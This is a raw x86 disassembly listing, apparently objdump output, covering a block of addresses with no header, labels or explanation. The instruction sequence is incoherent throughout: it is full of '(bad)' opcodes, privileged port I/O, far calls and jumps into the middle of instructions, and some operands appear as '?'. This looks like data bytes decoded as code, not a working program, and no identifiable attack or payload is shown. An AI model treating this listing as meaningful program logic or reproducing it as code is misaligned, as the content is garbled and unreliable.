  416445:	or     esp,ecx
  416447:	hlt    
  416448:	mov    esi,0x14bb9530
  41644d:	dec    eax
  41644e:	jp     0x4163d9
  416450:	xchg   ebx,eax
  416451:	cmp    eax,0x9455eb27
  416456:	ins    BYTE PTR es:[edi],dx
  416457:	data16 adc ch,ah
  41645a:	in     eax,dx
  41645b:	(bad)
  41645e:	pop    ds
  41645f:	(bad)  
  416460:	repnz add ebx,DWORD PTR [esi-0x5a425d98]
  416467:	inc    ebp
  416468:	dec    esp
  416469:	xlat   BYTE PTR ds:[ebx]
  41646a:	cs call 0xb7e3:0x98d0d970
  416472:	imul   DWORD PTR [edi-0x4b42df5c]
  416478:	pop    ss
  416479:	call   DWORD PTR ds:0x579a0a6c
  41647f:	cmp    bh,dl
  416481:	and    DWORD PTR gs:[edx],ebp
  416484:	mov    bl,0x95
  416486:	pusha  
  416487:	bound  ecx,QWORD PTR [edx-0x3a5a3cfc]
  41648d:	les    ebp,FWORD PTR [eax+0x63]
  416490:	mov    esi,0xc3e4c47e
  416495:	les    edx,FWORD PTR [edi+edi*1]
  416498:	outs   dx,DWORD PTR ds:[esi]
  416499:	js     0x41649f
  41649b:	adc    DWORD PTR [ecx+0x44],ebx
  41649e:	mov    eax,0x7ec68c4f
  4164a3:	clc    
  4164a4:	ins    BYTE PTR es:[edi],dx
  4164a5:	and    eax,0xbbc102e9
  4164aa:	pusha  
  4164ab:	fst    QWORD PTR cs:[edi-0x4c]
  4164af:	push   esi
  4164b0:	std    
  4164b1:	mov    gs,WORD PTR [ecx]
  4164b3:	jno    0x41643c
  4164b5:	cmp    dl,BYTE PTR [eax-0x4850d720]
  4164bb:	shl    DWORD PTR [ebx+0x60358c72],1
  4164c1:	xor    edi,DWORD PTR [ebx+0x6c4466aa]
  4164c7:	fld    QWORD PTR [ecx-0x178a03a1]
  4164cd:	xchg   esi,eax
  4164ce:	scas   al,BYTE PTR es:[edi]
  4164cf:	sbb    BYTE PTR [ebx],cl
  4164d1:	or     BYTE PTR [ecx+0x74aced07],cl
  4164d7:	xor    dl,BYTE PTR [ebx+eax*2+0x72]
  4164db:	adc    cl,dl
  4164dd:	adc    eax,edx
  4164df:	ret    
  4164e0:	dec    edx
  4164e1:	pop    ecx
  4164e2:	outs   dx,BYTE PTR ds:[esi]
  4164e3:	sub    DWORD PTR [edx+0x2a44754c],ecx
  4164e9:	addr16 pop esp
  4164eb:	mov    bh,0x86
  4164ed:	push   cs
  4164ee:	es mov bh,0x8d
  4164f1:	mov    al,0xb3
  4164f3:	inc    ebp
  4164f4:	dec    ebx
  4164f5:	push   esp
  4164f6:	dec    edx
  4164f7:	or     eax,0x25310d16
  4164fc:	sub    dl,BYTE PTR [ebx+0x45]
  4164ff:	int3   
  416500:	retf   
  416501:	mov    dh,0xf0
  416503:	push   cs
  416504:	mov    al,0xc2
  416506:	mov    esp,0xe2731e87
  41650b:	jns    0x416520
  41650d:	or     DWORD PTR [ecx],eax
  41650f:	js     0x416504
  416511:	xchg   ebx,eax
  416512:	data16 adc al,0x13
  416515:	arpl   WORD PTR [edx-0x14],cx
  416518:	sbb    DWORD PTR [edi-0x4cfea4e4],edi
  41651e:	cs pop ebp
  416520:	jne    0x416518
  416522:	imul   DWORD PTR [edx]
  416524:	jmp    0x4164c4
  416526:	add    eax,0x8cad378f
  41652b:	xor    esp,edi
  41652d:	outs   dx,DWORD PTR ds:[esi]
  41652e:	xchg   edi,eax
  41652f:	mov    ds:0x758d6062,eax
  416534:	pop    ds
  416535:	das    
  416536:	xchg   edx,eax
  416537:	daa    
  416538:	sub    eax,0x92dd06db
  41653d:	push   ecx
  41653e:	push   cs
  41653f:	(bad)  
  416540:	jae    0x416511
  416542:	cwde   
  416543:	pop    ss
  416544:	sbb    DWORD PTR [edi],ebx
  416546:	ret    
  416547:	pop    edx
  416548:	inc    eax
  416549:	and    eax,0xb03d70b3
  41654e:	in     eax,0xa
  416550:	inc    ecx
  416551:	jns    0x416540
  416553:	add    cl,cl
  416555:	ret    
  416556:	imul   edx,DWORD PTR [edx+ecx*4-0x19],0x77f605d4
  41655e:	add    al,0xac
  416560:	add    edx,edx
  416562:	arpl   bx,bp
  416564:	or     eax,0x7d0855e9
  416569:	push   es
  41656a:	cli    
  41656b:	adc    eax,esp
  41656d:	(bad)  
  41656e:	loopne 0x416576
  416570:	mov    dl,0x83
  416572:	sahf   
  416573:	and    eax,0x67f9ff21
  416578:	fiadd  WORD PTR [edi]
  41657a:	fst    st(6)
  41657c:	ins    DWORD PTR es:[edi],dx
  41657d:	push   ebp
  41657e:	dec    ebx
  41657f:	or     al,0x4f
  416581:	(bad)  
  416582:	pop    esp
  416583:	ror    DWORD PTR [esi+esi*1-0x6b],1
  416587:	sar    ah,1
  416589:	sbb    al,0xc7
  41658b:	retf   
  41658c:	push   esi
  41658d:	xchg   edi,eax
  41658e:	inc    ebp
  41658f:	mov    esi,0xbf15f0b6
  416594:	js     0xbb0b48c7
  41659a:	sahf   
  41659b:	mov    WORD PTR [ecx],gs
  41659d:	lea    edi,[edi+0x47fae3a7]
  4165a3:	jns    0x416554
  4165a5:	in     al,dx
  4165a6:	pop    es
  4165a7:	bswap  cx
  4165aa:	jmp    0x1b1d1a96
  4165af:	retf   0xa6b5
  4165b2:	or     ebp,ebp
  4165b4:	nop
  4165b5:	sbb    edi,DWORD PTR [ebx-0x28fcd309]
  4165bb:	jge    0x416593
  4165bd:	stos   WORD PTR es:[edi],ax
  4165bf:	dec    esp
  4165c0:	push   ss
  4165c1:	ret    
  4165c2:	xchg   esi,eax
  4165c3:	and    bl,dh
  4165c5:	xor    ch,BYTE PTR ds:0x3e534824
  4165cb:	ja     0x416592
  4165cd:	(bad)  
  4165ce:	(bad)  
  4165d0:	mov    eax,0xf164301c
  4165d5:	inc    edi
  4165d6:	pop    ebx
  4165d7:	mov    ds:0x6b2f11a9,al
  4165dc:	retf   0x382a
  4165df:	icebp  
  4165e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165e1:	test   DWORD PTR [edx+0x3d9656a2],edx
  4165e7:	pop    es
  4165e8:	in     al,dx
  4165e9:	fst    DWORD PTR [edx-0x61]
  4165ec:	pop    edi
  4165ed:	popa   
  4165ee:	dec    edi
  4165ef:	pop    esi
  4165f0:	mov    bl,0x7
  4165f2:	in     al,0xee
  4165f4:	cmp    al,0xc7
  4165f6:	dec    edi
  4165f7:	pop    ebp
  4165f8:	adc    esp,DWORD PTR [ebx]
  4165fa:	out    0xef,eax
  4165fc:	jno    0x4165d1
  4165fe:	push   edi
  4165ff:	(bad)  
  416600:	dec    esp
  416601:	in     eax,0x39
  416603:	pop    DWORD PTR [edi+0x4a]
  416606:	sbb    eax,0xf2e57bca
  41660b:	adc    ah,BYTE PTR [edx+0x44]
  41660e:	ja     0x41664e
  416610:	aas    
  416611:	add    eax,0x6b159265
  416616:	rcl    BYTE PTR [eax],0xc8
  416619:	xchg   ebp,eax
  41661a:	sti    
  41661b:	xlat   BYTE PTR ds:[ebx]
  41661c:	shr    BYTE PTR [ebx+0xb],cl
  41661f:	cs xor dl,al
  416622:	shl    DWORD PTR [ecx],cl
  416624:	push   es
  416625:	fadd   DWORD PTR [edx-0x34]
  416628:	push   edi
  416629:	and    BYTE PTR [ebp-0x51497b17],bh
  41662f:	gs ret 
  416631:	not    dl
  416633:	push   edi
  416634:	jmp    DWORD PTR [ebp+0x5edac8ce]
  41663a:	sbb    al,0x7c
  41663c:	pop    es
  41663d:	sahf   
  41663e:	jge    0x4165fe
  416640:	pop    ds
  416641:	add    ebx,edi
  416643:	iret   
  416644:	cdq    
  416645:	and    BYTE PTR [ecx-0x24],ah
  416648:	sbb    al,0x22
  41664a:	dec    esp
  41664b:	push   esp
  41664c:	xor    al,0xfa
  41664f:	push   edx
  416650:	std    
  416651:	and    bl,BYTE PTR [edi+0x45]
  416654:	sbb    al,0x72
  416656:	fsin   
  416658:	icebp  
  416659:	ins    DWORD PTR es:[edi],dx
  41665a:	aam    0x1f
  41665c:	mov    esp,DWORD PTR [esi-0x36]
  41665f:	idiv   BYTE PTR [edx+0x72]
  416662:	pop    ds
  416663:	icebp  
  416664:	imul   ebp,DWORD PTR [eax+0x4aa8c845],0x19
  41666b:	hlt    
  41666c:	pop    ecx
  41666d:	scas   eax,DWORD PTR es:[edi]
  41666e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41666f:	punpckhdq mm2,QWORD PTR [eax-0x2f7e9b4a]
  416676:	push   ebx
  416677:	mov    edi,0xb35a6295
  41667c:	mov    dl,BYTE PTR [eax-0x2a]
  41667f:	fldenv [esi+0x1d]
  416682:	sbb    dh,BYTE PTR [ebx-0x2b84fd39]
  416688:	or     DWORD PTR [ebp+0x9],edx
  41668b:	into   
  41668c:	mov    ds:0xddf8a832,al
  416691:	push   0xffffffa4
  416693:	in     al,dx
  416694:	jl     0x416616
  416696:	push   ebp
  416697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416698:	aaa    
  416699:	mov    ecx,0xefa6f900
  41669e:	lahf   
  41669f:	adc    eax,0x225325d4
  4166a4:	shl    DWORD PTR [ebx+0x26],cl
  4166a7:	push   eax
  4166a8:	jnp    0x41663f
  4166aa:	or     BYTE PTR [ebp-0x1f],0xa6
  4166ae:	and    BYTE PTR [edi+eax*8+0x2b6912c6],dl
  4166b5:	icebp  
  4166b6:	pop    ds
  4166b7:	in     al,dx
  4166b8:	adc    eax,ebp
  4166ba:	pop    es
  4166bb:	push   ebx
  4166bc:	adc    eax,0x4c74a8eb
  4166c1:	repz das 
  4166c3:	and    al,0xa0
  4166c5:	push   ecx
  4166c6:	mov    BYTE PTR [esi+0x26507812],ch
  4166cc:	add    ebx,DWORD PTR [edi-0x6a846715]
  4166d2:	lahf   
  4166d3:	imul   ebp,DWORD PTR [ecx],0x4
  4166d6:	add    ch,bh
  4166d8:	sbb    BYTE PTR [edi],bl
  4166da:	push   esp
  4166db:	pop    edx
  4166dc:	int    0x11
  4166de:	dec    ebp
  4166df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166e0:	mov    ah,BYTE PTR [ebx+edi*1-0x3881180d]
  4166e7:	ins    BYTE PTR es:[edi],dx
  4166e8:	(bad)  
  4166e9:	cld    
  4166ea:	jp     0x416689
  4166ec:	mov    ebx,0x8fcb08f3
  4166f1:	mov    al,ds:0xcd5562c2
  4166f6:	push   ds
  4166f7:	add    cl,BYTE PTR [edi+eiz*4-0x5c]
  4166fb:	dec    edx
  4166fc:	leave  
  4166fd:	inc    edi
  4166fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ff:	xchg   ebp,eax
  416700:	and    bl,ah
  416702:	cmp    ebx,DWORD PTR [edi]
  416704:	xor    ecx,DWORD PTR [ebp+0xa]
  416707:	and    al,0xca
  416709:	mov    ah,0xd1
  41670b:	je     0x4166af
  41670d:	(bad)  
  41670e:	enter  0x9502,0xfd
  416712:	cmp    esp,DWORD PTR [ecx-0x72d7fb4e]
  416718:	pop    eax
  416719:	out    dx,eax
  41671a:	or     DWORD PTR [ebx],edi
  41671c:	ins    BYTE PTR es:[edi],dx
  41671d:	mov    ?,ebp
  41671f:	pop    es
  416720:	loop   0x416732
  416722:	push   0xfffffff4
  416724:	jns    0x416734
  416726:	or     al,0x45
  416728:	adc    esi,esi
  41672a:	outs   dx,BYTE PTR ds:[esi]
  41672b:	jecxz  0x416724
  41672d:	ret    0x3589
  416730:	gs push ebx
  416732:	ins    BYTE PTR es:[edi],dx
  416733:	popa   
  416734:	adc    esp,DWORD PTR [ecx]
  416736:	sbb    DWORD PTR [esi],esi
  416738:	mov    ebp,DWORD PTR [ebp+0x9]
  41673b:	mov    bh,0x21
  41673d:	mov    ?,WORD PTR [ebp+0x5f083915]
  416743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416744:	ret    0x4c38
  416747:	sbb    bl,ah
  416749:	jbe    0x4167b3
  41674b:	adc    DWORD PTR [ebx-0x7911d967],eax
  416751:	and    eax,0xad19661a
  416756:	arpl   WORD PTR [eax-0x72dea824],bx
  41675c:	inc    ebx
  41675d:	dec    ecx
  41675e:	pop    es
  41675f:	push   cs
  416760:	xchg   esp,eax
  416761:	jb     0x4167bf
  416763:	lods   al,BYTE PTR ds:[esi]
  416764:	or     al,0x62
  416766:	jmp    0x416714
  416768:	inc    ebp
  416769:	cdq    
  41676a:	mov    DWORD PTR [edi-0x7ec4bc1b],ebx
  416770:	sbb    BYTE PTR [ebx],dl
  416772:	daa    
  416773:	add    edi,DWORD PTR [eax+edi*8]
  416776:	pop    es
  416777:	pop    ecx
  416778:	mov    esi,0x29e6ca28
  41677d:	dec    edi
  41677e:	xchg   esi,eax
  41677f:	xchg   ecx,eax
  416780:	mov    DWORD PTR [esi],edx
  416782:	xchg   DWORD PTR [edx+0x4b],edi
  416785:	xchg   ecx,eax
  416786:	push   ebx
  416787:	fldcw  WORD PTR [edi+0x63]
  41678a:	sahf   
  41678b:	pop    edi
  41678c:	and    BYTE PTR ds:0x620babc0,cl
  416792:	cmp    BYTE PTR [ebp+edi*8-0x23],0x38
  416797:	jecxz  0x4167fc
  416799:	xor    edi,DWORD PTR [ebx-0x2613e0b9]
  41679f:	mov    cl,BYTE PTR [esi]
  4167a1:	mov    bl,0x15
  4167a3:	iret   
  4167a4:	add    edi,DWORD PTR [ebx+edi*1+0x3fc0f73e]
  4167ab:	iret   
  4167ac:	(bad)  
  4167ad:	ret    0x3663
  4167b0:	sbb    eax,0x2bfe86d1
  4167b5:	ret    0x225a
  4167b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b9:	mov    es,WORD PTR [esi-0x75]
  4167bc:	fdiv   DWORD PTR [ebx]
  4167be:	sbb    ecx,DWORD PTR [edi-0x6]
  4167c1:	outs   dx,BYTE PTR ds:[esi]
  4167c2:	out    0x85,al
  4167c4:	daa    
  4167c5:	cs in  eax,dx
  4167c7:	cli    
  4167c8:	and    al,0x4d
  4167ca:	cli    
  4167cb:	inc    esi
  4167cc:	xchg   ebx,eax
  4167cd:	inc    eax
  4167ce:	sti    
  4167cf:	es jnp 0x4167ab
  4167d2:	out    dx,eax
  4167d3:	xchg   DWORD PTR [edi],ecx
  4167d5:	or     cl,BYTE PTR [ebp+0x3fabc004]
  4167db:	dec    esi
  4167dc:	cld    
  4167dd:	pop    esp
  4167de:	in     eax,dx
  4167df:	mov    esi,0x78270678
  4167e4:	xchg   edx,eax
  4167e5:	nop
  4167e6:	pop    ebp
  4167e7:	mov    eax,ds:0x98bf9b7f
  4167ec:	fcomip st,st(1)
  4167ee:	pop    es
  4167ef:	fadd   DWORD PTR [ebp-0x4629b871]
  4167f5:	(bad)  
  4167f6:	fstp   DWORD PTR [esi-0x2e86cc0b]
  4167fc:	jb     0x4167fc
  4167fe:	dec    ebx
  4167ff:	adc    al,0x1e
  416801:	stos   BYTE PTR es:[edi],al
  416802:	xlat   BYTE PTR ds:[ebx]
  416803:	xchg   DWORD PTR [edi+0x65f3797a],ebp
  416809:	ror    DWORD PTR [edi-0x68],0x8b
  41680d:	adc    eax,0x4cbf404e
  416812:	sub    BYTE PTR [edx+0x502bfe63],dl
  416818:	retf   
  416819:	bound  ebp,QWORD PTR [edx+0xa]
  41681c:	xor    esp,ecx
  41681e:	dec    ecx
  41681f:	sbb    BYTE PTR [ecx-0x53e1f16a],ah
  416825:	cwde   
  416826:	popf   
  416827:	push   edi
  416828:	in     al,0xf4
  41682a:	xlat   BYTE PTR ds:[ebx]
  41682b:	int3   
  41682c:	in     eax,0x28
  41682e:	jno    0x416895
  416830:	add    eax,0x646c326e
  416835:	mov    ebx,0x9e6fd7b5
  41683a:	mov    al,ds:0x38d80296
  41683f:	imul   edi,ebx,0xffffffbc
  416842:	out    dx,al
  416843:	neg    DWORD PTR [ecx-0x33a3806]
  416849:	scas   eax,DWORD PTR es:[edi]
  41684a:	(bad)  
  41684c:	inc    edx
  41684d:	not    esp
  41684f:	lahf   
  416850:	adc    bh,BYTE PTR [ecx+0x1f5ff2b7]
  416856:	xchg   edx,eax
  416857:	lock pop eax
  416859:	aad    0x6
  41685b:	xchg   edi,eax
  41685c:	and    DWORD PTR [esi-0x1e],0x1b
  416860:	mov    DWORD PTR [eax-0x5a57f777],esp
  416866:	adc    eax,0xea6ce0ef
  41686b:	inc    edx
  41686c:	int3   
  41686d:	xor    al,0xb2
  41686f:	out    dx,al
  416870:	xlat   BYTE PTR ds:[ebx]
  416871:	jne    0x41684b
  416873:	inc    esi
  416874:	jb     0x416821
  416876:	sbb    ch,BYTE PTR [ecx-0x4584a631]
  41687c:	inc    ecx
  41687d:	ret    0x3bc9
  416880:	jbe    0x4168cc
  416882:	fisttp DWORD PTR [ebx-0x35]
  416885:	and    bh,BYTE PTR [esi+edi*8-0x609f1c66]
  41688c:	enter  0xfcc4,0xd1
  416890:	mov    dl,0x2
  416892:	stos   DWORD PTR es:[edi],eax
  416893:	inc    ebx
  416894:	xchg   ebx,eax
  416895:	test   BYTE PTR ds:0xe66230d4,dh
  41689b:	jl     0x416878
  41689d:	cmc    
  41689e:	pushf  
  41689f:	cmp    eax,0xd63b9376
  4168a4:	mov    al,0xe6
  4168a6:	push   0x6
  4168a8:	stos   BYTE PTR es:[edi],al
  4168a9:	push   ecx
  4168aa:	add    BYTE PTR [eax+0x5b],bl
  4168ad:	ja     0x41687d
  4168af:	into   
  4168b0:	(bad)  
  4168b1:	(bad)  [edi+0x5a6f8016]
  4168b7:	sub    ah,BYTE PTR [esi]
  4168b9:	repnz int3 
  4168bb:	mov    ds:0x9673e164,eax
  4168c0:	push   0xcd482b87
  4168c5:	fcom   QWORD PTR [edx-0x30ad7e9f]
  4168cb:	inc    edi
  4168cc:	nop
  4168cd:	loopne 0x416922
  4168cf:	(bad)  
  4168d0:	std    
  4168d1:	xor    edi,DWORD PTR [ebx-0x75]
  4168d4:	dec    eax
  4168d5:	dec    ebx
  4168d6:	sbb    BYTE PTR [edi+0x6e],ah
  4168d9:	fstp   TBYTE PTR [esp+eax*8-0x34a59c0]
  4168e0:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4168e2:	push   esp
  4168e3:	call   0x1041e22c
  4168e8:	adc    ch,BYTE PTR [ebp-0x38]
  4168eb:	adc    cl,BYTE PTR [edx+0x16]
  4168ee:	outs   dx,DWORD PTR ds:[esi]
  4168ef:	xchg   ebx,eax
  4168f0:	loop   0x41694d
  4168f2:	icebp  
  4168f3:	cld    
  4168f4:	xor    ebx,DWORD PTR [ebp-0x55]
  4168f7:	ins    BYTE PTR es:[edi],dx
  4168f8:	inc    ebp
  4168f9:	inc    edx
  4168fa:	ins    DWORD PTR es:[edi],dx
  4168fb:	sbb    esp,DWORD PTR [ecx-0x64544930]
  416901:	dec    di
  416903:	push   edx
  416904:	sbb    ch,BYTE PTR [ebx]
  416906:	xchg   esp,eax
  416907:	or     ecx,eax
  416909:	leave  
  41690a:	push   ss
  41690b:	ret    
  41690c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41690d:	test   ch,dh
  41690f:	add    DWORD PTR [edi-0x57],edi
  416912:	cmp    ah,BYTE PTR [eax-0x4b3fefaf]
  416918:	push   ebx
  416919:	xor    al,0x49
  41691b:	cmp    al,0x2e
  41691d:	rcl    ah,cl
  41691f:	(bad)  
  416921:	pop    esp
  416922:	sub    edi,DWORD PTR ds:0xb85be913
  416928:	cmp    eax,0xfffbbcf9
  41692d:	mov    WORD PTR [eax-0x4fa48a59],es
  416933:	push   edx
  416934:	xchg   edi,eax
  416935:	ins    BYTE PTR es:[edi],dx
  416936:	pushf  
  416937:	jmp    0xd7df:0xfb0b40fd
  41693e:	addr16 mov ecx,0x358216a9
  416944:	and    al,0x2b
  416946:	fld    QWORD PTR [edx+0x4d]
  416949:	daa    
  41694a:	pop    esp
  41694b:	cmc    
  41694c:	call   0xb6022801
  416951:	maskmovq mm0,(bad)
  416952:	test   DWORD PTR [edx+0x5e],0xec8506a0
  416959:	mov    edi,ebx
  41695b:	(bad)  
  41695c:	lock sbb DWORD PTR [esi],ebp
  41695f:	xor    eax,0x8534348f
  416964:	cmp    BYTE PTR [esi+0x4151b394],bh
  41696a:	adc    BYTE PTR [ebx-0x7d],dl
  41696d:	xchg   ebx,eax
  41696f:	ror    DWORD PTR [edi+0x72],1
  416972:	jp     0x416986
  416974:	(bad)  
  416975:	cdq    
  416976:	adc    eax,0x743dfbd5
  41697b:	(bad)  
  41697d:	leave  
  41697e:	aaa    
  41697f:	in     eax,dx
  416980:	pop    ebx
  416981:	addr16 ret 
  416983:	mov    al,0x8f
  416985:	and    dh,al
  416987:	xchg   edx,eax
  416988:	adc    DWORD PTR [eax+0x130f7864],eax
  41698e:	push   0x2d
  416990:	fwait
  416991:	xor    ch,dl
  416993:	adc    al,0x88
  416995:	cmc    
  416996:	dec    edi
  416997:	clc    
  416998:	mov    BYTE PTR [ebp+0x6edebc19],bl
  41699e:	inc    ecx
  41699f:	dec    esp
  4169a0:	gs test dh,dh
  4169a3:	cdq    
  4169a4:	out    0x5b,al
  4169a6:	repz das 
  4169a8:	inc    ecx
  4169a9:	sbb    eax,0xe9a98bf7
  4169ae:	or     BYTE PTR ds:0xde74e920,al
  4169b4:	lock mov ch,0xba
  4169b7:	mov    ah,0x4f
  4169b9:	cmp    edx,DWORD PTR [ecx+0x9a3d847]
  4169bf:	(bad)  
  4169c0:	mov    ch,0xe0
  4169c2:	sub    eax,0x94b82aac
  4169c7:	sbb    ecx,0x22a028d1
  4169cd:	inc    eax
  4169ce:	pop    ecx
  4169cf:	loopne 0x4169e1
  4169d1:	mov    cs,edi
  4169d3:	in     eax,dx
  4169d4:	je     0x4169b7
  4169d6:	xchg   ecx,eax
  4169d7:	inc    esp
  4169d8:	sbb    DWORD PTR [edx],ebx
  4169da:	or     bh,ch
  4169dc:	xor    ebp,DWORD PTR [ebx]
  4169de:	or     eax,0xa01dbd1b
  4169e3:	inc    esi
  4169e4:	inc    eax
  4169e5:	stc    
  4169e6:	mov    ch,BYTE PTR [edx-0x6b482701]
  4169ec:	jmp    DWORD PTR cs:[eax+0x5a]
  4169f0:	push   eax
  4169f1:	or     esp,DWORD PTR [ebx]
  4169f3:	aas    
  4169f4:	jo     0x4169af
  4169f6:	cli    
  4169f7:	ret    0x2265
  4169fa:	xor    al,0x4c
  4169fc:	pop    edi
  4169fd:	add    al,dh
  4169ff:	sbb    ecx,DWORD PTR [ebx-0x79]
  416a02:	sbb    dl,BYTE PTR [ecx+0x26]
  416a05:	mov    dh,al
  416a07:	jge    0x4169b7
  416a09:	push   ss
  416a0a:	cmp    eax,0xf38a25fb
  416a0f:	xchg   ebp,eax
  416a10:	jg     0x41699b
  416a12:	neg    esi
  416a14:	cs call 0xadcbbb68
  416a1a:	xchg   esi,eax
  416a1b:	je     0x4169f5
  416a1d:	xchg   edi,eax
  416a1e:	cmp    BYTE PTR [ecx+0x53fba8a],ah
  416a24:	push   ss
  416a25:	leave  
  416a26:	or     BYTE PTR [eax],0xee
  416a29:	in     al,0x94
  416a2b:	jmp    0x4169e1
  416a2d:	or     al,0xea
  416a2f:	add    edx,DWORD PTR [ebx+0x3]
  416a32:	mov    ds:0x19aa8a6c,eax
  416a37:	adc    esp,DWORD PTR [esi+0x5c]
  416a3a:	adc    BYTE PTR [ebx+0x11],dl
  416a3d:	adc    al,0xdd
  416a3f:	adc    al,0xf3
  416a41:	cmp    ecx,ecx
  416a43:	(bad)  
  416a44:	out    0xfc,eax
  416a46:	sar    DWORD PTR [ebp+0x1c],cl
  416a49:	imul   edi,DWORD PTR [esi+edx*4-0x4d2d4206],0x67f2bacc
  416a54:	pop    eax
  416a56:	xchg   ebp,eax
  416a57:	in     al,dx
  416a58:	mov    bh,0x53
  416a5a:	or     DWORD PTR ds:0x39b1ba9c,eax
  416a60:	mov    dl,0xc1
  416a62:	repz push ebp
  416a64:	sbb    dh,BYTE PTR [edi+0xd557f08]
  416a6a:	repz scas al,BYTE PTR es:[edi]
  416a6c:	push   ds
  416a6d:	mov    dh,0x3d
  416a6f:	iret   
  416a70:	loope  0x416a42
  416a72:	push   0x30
  416a74:	dec    eax
  416a75:	xchg   esp,eax
  416a76:	xor    ch,BYTE PTR [edx]
  416a78:	loopne 0x416ac9
  416a7a:	mov    cl,0x22
  416a7c:	inc    eax
  416a7d:	loop   0x416a87
  416a7f:	and    eax,0x2292cc78
  416a84:	inc    edx
  416a85:	adc    esi,edx
  416a87:	and    eax,0xe3aad427
  416a8c:	mov    dh,BYTE PTR [edi]
  416a8e:	mov    eax,ds:0x807da88
  416a93:	push   esp
  416a94:	jp     0x416a78
  416a96:	mov    al,ds:0x9dac295d
  416a9b:	out    0xf3,eax
  416a9d:	in     al,dx
  416a9e:	in     al,dx
  416a9f:	or     dh,dh
  416aa1:	or     BYTE PTR [eax+0x13],dl
  416aa4:	int    0x1
  416aa6:	xchg   esi,eax
  416aa7:	push   edx
  416aa8:	jmp    0x416a31
  416aaa:	mov    DWORD PTR [ebx],ebp
  416aac:	mov    ebp,0x8439d229
  416ab1:	jbe    0x416b0e
  416ab3:	push   ss
  416ab4:	sar    bl,0xa5
  416ab7:	mov    WORD PTR [eax+0x20565542],ss
  416abd:	addr16 mov ds:0xc1a,al
  416ac1:	out    0x7c,al
  416ac3:	imul   edi,DWORD PTR [eax],0xffffffb2
  416ac6:	sbb    eax,0x641ba96f
  416acb:	shl    BYTE PTR [ecx+0x62462f33],1
  416ad1:	pop    eax
  416ad2:	pop    ss
  416ad3:	lds    ebx,FWORD PTR [edi+0x6cfce260]
  416ad9:	sub    ecx,eax
  416adb:	push   0xae7e1bda
  416ae0:	pop    ss
  416ae1:	cmp    ecx,edi
  416ae3:	xlat   BYTE PTR ds:[ebx]
  416ae4:	shl    BYTE PTR [esi],1
  416ae6:	inc    edx
  416ae7:	js     0x416b5e
  416ae9:	fwait
  416aea:	jecxz  0x416a79
  416aec:	jmp    0x416adb
  416aee:	loopne 0x416b28
  416af0:	sub    edx,DWORD PTR [ebp+0x295c0071]
  416af6:	int3   
  416af7:	scas   eax,DWORD PTR es:[edi]
  416af8:	mov    WORD PTR [ebx-0x237fca97],ds
  416afe:	and    bh,dh
  416b00:	jge    0x416ac8
  416b02:	adc    ecx,DWORD PTR [ecx-0x399067bb]
  416b08:	add    eax,0x4ad32a25
  416b0d:	shl    BYTE PTR [ecx+ecx*1],0x57
  416b11:	call   0xde00b192
  416b16:	xor    bh,BYTE PTR [ecx]
  416b18:	sbb    eax,0x576192ce
  416b1d:	icebp  
  416b1e:	call   0x95dd:0x58ea538b
  416b25:	sub    DWORD PTR [ecx+0x1dd20b77],esi
  416b2b:	test   DWORD PTR [edx+0x54],ecx
  416b2e:	jecxz  0x416b9a
  416b30:	enter  0x452a,0x60
  416b34:	leave  
  416b35:	(bad)  
  416b36:	out    dx,al
  416b37:	mov    BYTE PTR cs:[edx-0x67],cl
  416b3b:	adc    BYTE PTR [esi+0xaa8c6fe],cl
  416b41:	cmp    al,BYTE PTR [eax]
  416b43:	out    dx,eax
  416b44:	sub    al,0xed
  416b46:	ret    0xcc55
  416b49:	push   edx
  416b4a:	popf   
  416b4b:	outs   dx,BYTE PTR ds:[esi]
  416b4c:	dec    ecx
  416b4d:	xchg   esp,eax
  416b4e:	addr16 leave 
  416b50:	fisttp QWORD PTR [esi+0x6624dac1]
  416b56:	pop    eax
  416b57:	rcr    DWORD PTR [edi-0x3c],0xcf
  416b5b:	xor    DWORD PTR [eax+0x7633d90e],eax
  416b61:	inc    ebp
  416b62:	hlt    
  416b63:	sti    
  416b64:	leave  
  416b65:	icebp  
  416b66:	and    ebx,DWORD PTR [edi-0x46]
  416b69:	pop    ebx
  416b6a:	mov    bh,0x7c
  416b6c:	rcl    BYTE PTR [ecx],cl
  416b6e:	enter  0xe30,0x1c
  416b72:	js     0x416b45
  416b74:	ret    
  416b75:	ds jmp 0x416afb
  416b78:	scas   eax,DWORD PTR es:[edi]
  416b79:	sub    al,0x93
  416b7b:	push   ebx
  416b7c:	out    0x67,eax
  416b7e:	ret    0x6030
  416b81:	lahf   
  416b82:	ss in  eax,dx
  416b84:	retf   
  416b85:	test   eax,0x9a715e2a
  416b8a:	outs   dx,DWORD PTR ds:[esi]
  416b8b:	stos   DWORD PTR es:[edi],eax
  416b8c:	add    eax,0xe305e528
  416b91:	jl     0x416b1d
  416b93:	imul   ecx,DWORD PTR [ecx-0xc],0x271de952
  416b9a:	hlt    
  416b9b:	fs in  eax,0x9b
  416b9e:	ss or  bl,bh
  416ba1:	mov    eax,0xd3a9b1e3
  416ba6:	inc    eax
  416ba7:	pop    edi
  416ba8:	jno    0x416b8e
  416baa:	pop    ds
  416bab:	loopne 0x416bd2
  416bad:	ss test eax,0xcee3fb33
  416bb3:	sti    
  416bb4:	jnp    0x416c10
  416bb6:	inc    ecx
  416bb7:	xchg   edi,eax
  416bb8:	clc    
  416bb9:	push   es
  416bba:	fistp  WORD PTR [eax+0x64]
  416bbd:	inc    esp
  416bbe:	and    dl,al
  416bc0:	pop    esi
  416bc1:	(bad)
  416bc5:	sti    
  416bc6:	stos   BYTE PTR es:[edi],al
  416bc7:	out    dx,eax
  416bc8:	push   eax
  416bc9:	imul   esi,DWORD PTR [ecx-0x6c4ef95b],0x73de6781
  416bd3:	xchg   edx,eax
  416bd4:	dec    edx
  416bd5:	push   0xa4ac8a60
  416bda:	je     0x416b60
  416bdc:	add    dl,BYTE PTR [ebx]
  416bde:	and    eax,0x3b7cb687
  416be3:	in     al,0x8e
  416be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be6:	sub    eax,0x78fefe34
